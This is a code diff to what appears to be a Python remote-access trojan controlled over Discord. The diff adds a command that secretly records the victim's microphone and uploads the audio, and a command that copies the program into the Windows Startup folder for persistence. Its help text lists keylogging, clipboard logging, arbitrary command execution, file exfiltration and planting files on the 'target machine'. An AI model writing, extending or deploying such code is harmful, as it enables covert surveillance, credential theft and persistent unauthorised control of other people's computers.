@@ -1,4 +1,4 @@
-import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, json
+import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, sys, shutil, pyaudio, wave
 import discord, io, aiohttp
 
 from Clip_logging import Cliplogger
@@ -6,7 +6,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'YOUR TOKEN HERE'
+TOKEN = 'TOKENHERE'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -334,6 +334,54 @@ async def rmv(ctx: commands.Context, file:str=None):
     except (OSError, Exception) as e:
         await ctx.send(f"{e}")
 
+async def recordmic(ctx: commands.Context, time):
+    try:
+        if time is None or not str(time).isdigit():
+            await ctx.send("enter the time and will be recorded in seconds `.recordmic <sec>`")
+            return
+
+        time = int(time)
+
+        FORMAT = pyaudio.paInt16
+        CHANNEL = 1
+        RATE = 44100
+        CHUNK = 1024
+        frames = []
+
+        audio = pyaudio.PyAudio()
+        stream = audio.open(
+            format=FORMAT,
+            channels=CHANNEL,
+            rate=RATE,
+            input=True,
+            frames_per_buffer=CHUNK
+        )
+        await ctx.send(f"recording for {str(time)} seconds")
+        for i in range(0, int(RATE / CHUNK * time)):
+            data = stream.read(CHUNK)
+            frames.append(data)
+        await ctx.send(f"recording done! writing it..")
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        name = f"recordmic_{timestamp}.wav"
+
+        wf = wave.open(name, 'wb')
+        wf.setnchannels(CHANNEL)
+        wf.setsampwidth(audio.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+        wf.close()
+
+        await ctx.send(content="**retrieved file is ready to play!**", file=discord.File(name))
+
+        if os.path.exists(name):
+            os.remove(name)
+    except Exception as e:
+        await ctx.send(f"{e}")
+
 async def MakeandJoinGuild(guild):
     bot_user, bot_machine = get_current_userAndMachine()
     formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
@@ -351,34 +399,51 @@ async def MakeandJoinGuild(guild):
         except discord.Forbidden:
             print("cannot send messages")
 
+async def CopytoStartUpFolder(ctx: commands.Context):
+    ScriptPath = os.path.abspath(sys.executable)
+    scriptName = os.path.basename(ScriptPath)
+    startupFolderPath = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+    startupFolder = os.path.join(startupFolderPath, scriptName)
+
+    if not os.path.exists(startupFolder):
+        try:
+            shutil.copy2(ScriptPath, startupFolder)
+            await ctx.send("file has been copied to startup folder!")
+        except Exception as e:
+            await ctx.send(f"**failed to copy file**\n```\nerror:\n{e}\n```")
+    else:
+        await ctx.send("file is already in startup")
+
 async def help(ctx: commands.Context):
     help = (
         "**commands:**\n"
         "```\n"
         "::GENERAL COMMAND\n"
-        ".help      >> shows this message\n"
-        ".cd        >> change directory\n"
-        ".ls        >> list directory\n"
-        ".who       >> shows current user and machine\n"
-        ".hello     >> to check if bot still on\n"
-        ".marco     >> check latency\n"
-        ".rmv       >> remove file\n"
-        ".exe       >> execute windows command\n"
-        ".size      >> calculate file size\n"
+        ".help      :: shows this message\n"
+        ".cd <[folder]> :: change directory\n"
+        ".ls [folder] :: list directory\n"
+        ".who       :: shows current user and machine\n"
+        ".hello     :: to check if bot still on\n"
+        ".marco     :: check latency\n"
+        ".rmv <file> :: remove file\n"
+        ".exe <command> :: execute windows command\n"
+        ".size <file> :: calculate file size\n"
+        ".addstartup :: add program to startup\n"
+        ".recordmic <time> :: record audio and save it\n"
         "\n"
         "::FILE TRANSFER\n"
-        ".download  >> turns a file into downloadable link\n"
-        ".upload    >> request a file from a url and plant it in target machine\n"
+        ".download <file> [time] :: turns a file into downloadable link\n"
+        ".upload <url-with-file> [name] :: request a file from a url and plant it in target machine\n"
         "\n"
         "::LOGGER\n"
         "   ::KEYLOGGING\n"
-        "    .keylog_start  >> start keylogger\n"
-        "    .keylog_read   >> dumps keylogger\n"
-        "    .keylog_stop   >> stops keylogger\n"
+        "    .keylog_start  :: start keylogger\n"
+        "    .keylog_read   :: dumps keylogger\n"
+        "    .keylog_stop   :: stops keylogger\n"
         "   ::CLIPLOGGING\n"
-        "    .cliplog_start >> start clipboard logger\n"
-        "    .cliplog_read  >> dumps clipboard logger\n"
-        "    .cliplog_stop  >> stops clipboard logger\n"
+        "    .cliplog_start :: start clipboard logger\n"
+        "    .cliplog_read  :: dumps clipboard logger\n"
+        "    .cliplog_stop  :: stops clipboard logger\n"
         "```"
     )
     await ctx.send(help)
@@ -435,6 +500,12 @@ async def on_message(message):
             else:
                 file = " ".join(arg)
                 await size(ctx, file=file)
+        elif command == ".recordmic":
+            if not arg:
+                await recordmic(ctx)
+            else:
+                time = " ".join(arg)
+                await recordmic(ctx, time=time)
 
         elif command == ".download":
             if not arg:
@@ -497,6 +568,9 @@ async def on_message(message):
 
         elif command == ".help":
             await help(ctx)
+        elif command == ".addstartup":
+            await CopytoStartUpFolder(ctx)
+
         else:
             await ctx.send(f"unknown command '{command}', type '.help' for help")
             return
